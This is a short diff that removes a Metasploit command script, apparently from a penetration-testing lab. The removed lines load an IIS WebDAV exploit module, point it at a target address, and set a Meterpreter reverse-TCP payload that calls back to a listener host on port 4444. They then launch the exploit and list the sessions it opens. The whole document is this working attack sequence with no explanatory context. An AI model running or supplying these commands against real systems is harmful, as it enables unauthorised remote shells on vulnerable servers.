@@ -1,9 +1,0 @@
-use exploit/windows/iis/iis_webdav_scstoragepathfromurl
-set RHOSTS 10.129.45.100
-set payload windows/meterpreter/reverse_tcp
-set LHOST 10.10.14.15
-set LPORT 4444
-show options
-exploit -j
-sleep 5
-sessions -l 
